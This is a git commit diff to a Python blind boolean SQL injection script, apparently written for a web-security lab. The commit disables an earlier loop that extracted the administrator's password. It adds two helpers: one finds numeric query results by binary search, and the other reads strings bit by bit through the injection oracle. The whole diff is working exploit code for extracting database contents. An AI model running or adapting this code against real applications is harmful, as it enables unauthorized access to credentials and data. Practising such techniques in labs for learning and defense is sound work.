5e2a91788d0e2df7b1b37b5359836e8ee22ad243
PK <136787670+H4ck3rxPK@users.noreply.github.com>
2025-05-10 09:20:48 +0800

    Update SQLM0US3_Boolean.py

--- SQLM0US3_Boolean.py
+++ SQLM0US3_Boolean.py
@@ -18,6 +18,7 @@ def oracle(q):
     return "Welcome back!" in response.text
 
 #Calculate the Length
+"""
 length=0
 while not oracle(f"(SELECT LENGTH(password) FROM users WHERE username = 'administrator') = {length}"):
     length += 1
@@ -31,3 +32,26 @@ for i in range(1, length+1):
             sys.stdout.flush()
             break
 print()
+"""
+
+def dumpNumber(q):
+    low = 0
+    high = 127
+    while low <= high:
+        mid = (low+high) // 2
+        if oracle(f"({q}) BETWEEN {low} AND {mid}"):
+            high = mid -1
+        else:
+            low = mid + 1
+    return low
+
+def dumpString(q, length):
+    val = ""
+    for i in range(1, length+1):
+        c = 0
+        for p in range(7):
+            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
+                c |= 2**p
+        val += chr(c)
+    return val
+
